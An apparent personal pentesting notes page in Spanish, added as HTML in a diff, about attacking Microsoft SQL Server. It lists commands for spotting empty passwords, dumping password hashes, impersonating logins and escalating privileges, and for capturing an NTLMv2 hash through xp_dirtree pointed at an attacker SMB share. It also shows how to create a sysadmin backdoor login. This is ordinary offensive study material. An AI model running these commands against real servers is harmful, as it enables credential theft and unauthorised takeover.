@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Está todo en la página de hacktricks, importante mirar exploits para la versión&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Está todo en la página de hacktricks, importante mirar exploits para la versión</p>
+
+<p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=sql%20server#1433---pentesting-mssql---microsoft-sql-server">1433 - Pentesting MSSQL - Microsoft SQL Server - HackTricks</a></p>
+
+<h1 id="sin-credenciales-">Sin credenciales :</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 &lt;IP&gt;
+</code></pre></div></div>
+
+<h1 id="con-credenciales">Con credenciales</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mssqlclient.py <span class="o">[</span><span class="nt">-db</span> volume] <span class="nt">-windows-auth</span> &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+</code></pre></div></div>
+
+<p>Listar usuarios</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">name</span><span class="p">,</span> <span class="n">create_date</span><span class="p">,</span> <span class="n">modify_date</span><span class="p">,</span> <span class="n">type_desc</span> <span class="k">as</span> <span class="k">type</span><span class="p">,</span> <span class="n">authentication_type_desc</span> <span class="k">as</span> <span class="n">authentication_type</span><span class="p">,</span> <span class="n">sid</span> <span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">where</span> <span class="k">type</span> <span class="k">not</span> <span class="k">in</span> <span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'R'</span><span class="p">)</span> <span class="k">order</span> <span class="k">by</span> <span class="n">name</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Listar usuarios que podemos impersonar (quizás tienen acceso a bases de datos que nosotros no tenemos)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc mssql 192.168.162.40 <span class="nt">-u</span> <span class="s1">'discovery'</span> <span class="nt">-p</span> <span class="s1">'Start123!'</span> <span class="nt">-M</span> enum_impersonate
+</code></pre></div></div>
+
+<p>Listar sysadmins</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Use</span> <span class="n">master</span><span class="p">;</span> <span class="k">EXEC</span> <span class="n">sp_helpsrvrolemember</span> <span class="s1">'sysadmin'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Logins que permiten entrar al motor SQL</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc mssql 192.168.162.40 <span class="nt">-u</span> <span class="s1">'discovery'</span> <span class="nt">-p</span> <span class="s1">'Start123!'</span> <span class="nt">-M</span> enum_logins
+</code></pre></div></div>
+
+<p>Para enumerar si un usuario al que puedo impersonar es sysadmin</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">'hrappdb-reader'</span> <span class="k">SELECT</span> <span class="k">SYSTEM_USER</span> <span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h1 id="para-ver-si-puedo-hacer-privesc">Para ver si puedo hacer privesc</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td>[MSSQL PrivEsc</td>
+      <td>NetExec](https://www.netexec.wiki/mssql-protocol/mssql-privesc)</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc mssql &lt;ip&gt; -u user -p password -M mssql_priv
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc mssql &lt;ip&gt; -u user -p password -M mssql_priv --local-auth
+</code></pre></div></div>
+
+<h1 id="diversas-pruebas-con-netexec-">Diversas pruebas con netexec :</h1>
+
+<p>https://www.netexec.wiki/mssql-protocol/</p>
+
+<h1 id="obtener-hash-ntlmv2">Obtener hash NTLMv2</h1>
+
+<p>mssql lo corre el servicio sql_svc, podemos obtener su hash</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">EXEC</span> <span class="n">xp_dirtree</span> <span class="s1">'</span><span class="se">\\</span><span class="s1">IP</span><span class="se">\s</span><span class="s1">hare'</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver share ./share <span class="nt">-smb2support</span>
+</code></pre></div></div>
+
+<p>Si todo lo anterior falla, revisar los contenidos de la db</p>
+
+<h1 id="error-log">ERROR LOG</h1>
+
+<p>Puede contener creds</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\SQLServer\Logs
+type ERRORLOG.BAK
+</code></pre></div></div>
+
+<h1 id="comandos-básicos">COMANDOS BÁSICOS</h1>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="k">Get</span> <span class="k">version</span>
+<span class="k">select</span> <span class="o">@@</span><span class="k">version</span><span class="p">;</span>
+<span class="o">#</span> <span class="k">Get</span> <span class="k">user</span>
+<span class="k">select</span> <span class="n">user_name</span><span class="p">();</span>
+<span class="o">#</span> <span class="k">Get</span> <span class="n">databases</span>
+<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">;</span>
+<span class="o">#</span> <span class="n">Use</span> <span class="k">database</span>
+<span class="n">USE</span> <span class="n">master</span>
+
+<span class="o">#</span> <span class="k">Get</span> <span class="k">table</span> <span class="k">names</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="n">databaseName</span><span class="o">&gt;</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="p">;</span>
+
+<span class="o">#</span> <span class="n">List</span> <span class="k">table</span> <span class="n">content</span>
+<span class="n">USE</span> <span class="k">DATABASE</span><span class="p">;</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">TABLE</span><span class="p">;</span>
+
+<span class="o">#</span><span class="n">List</span> <span class="n">Linked</span> <span class="n">Servers</span>
+<span class="k">EXEC</span> <span class="n">sp_linkedservers</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">servers</span><span class="p">;</span>
+
+<span class="o">#</span><span class="n">List</span> <span class="n">users</span>
+<span class="k">select</span> <span class="n">sp</span><span class="p">.</span><span class="n">name</span> <span class="k">as</span> <span class="n">login</span><span class="p">,</span> <span class="n">sp</span><span class="p">.</span><span class="n">type_desc</span> <span class="k">as</span> <span class="n">login_type</span><span class="p">,</span> <span class="n">sl</span><span class="p">.</span><span class="n">password_hash</span><span class="p">,</span> <span class="n">sp</span><span class="p">.</span><span class="n">create_date</span><span class="p">,</span> <span class="n">sp</span><span class="p">.</span><span class="n">modify_date</span><span class="p">,</span> <span class="k">case</span> <span class="k">when</span> <span class="n">sp</span><span class="p">.</span><span class="n">is_disabled</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">then</span> <span class="s1">'Disabled'</span> <span class="k">else</span> <span class="s1">'Enabled'</span> <span class="k">end</span> <span class="k">as</span> <span class="n">status</span> <span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">sp</span> <span class="k">left</span> <span class="k">join</span> <span class="n">sys</span><span class="p">.</span><span class="n">sql_logins</span> <span class="n">sl</span> <span class="k">on</span> <span class="n">sp</span><span class="p">.</span><span class="n">principal_id</span> <span class="o">=</span> <span class="n">sl</span><span class="p">.</span><span class="n">principal_id</span> <span class="k">where</span> <span class="n">sp</span><span class="p">.</span><span class="k">type</span> <span class="k">not</span> <span class="k">in</span> <span class="p">(</span><span class="s1">'G'</span><span class="p">,</span> <span class="s1">'R'</span><span class="p">)</span> <span class="k">order</span> <span class="k">by</span> <span class="n">sp</span><span class="p">.</span><span class="n">name</span><span class="p">;</span>
+
+<span class="o">#</span><span class="k">Create</span> <span class="k">user</span> <span class="k">with</span> <span class="n">sysadmin</span> <span class="n">privs</span>
+<span class="k">CREATE</span> <span class="n">LOGIN</span> <span class="n">hacker</span> <span class="k">WITH</span> <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s1">'P@ssword123!'</span>
+<span class="k">EXEC</span> <span class="n">sp_addsrvrolemember</span> <span class="s1">'hacker'</span><span class="p">,</span> <span class="s1">'sysadmin'</span>
+
+<span class="o">#</span><span class="n">Enumerate</span> <span class="n">links</span>
+<span class="n">enum_links</span>
+
+<span class="o">#</span><span class="n">Use</span> <span class="n">a</span> <span class="n">link</span>
+<span class="n">use_link</span> <span class="p">[</span><span class="n">NAME</span><span class="p">]</span>
+
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
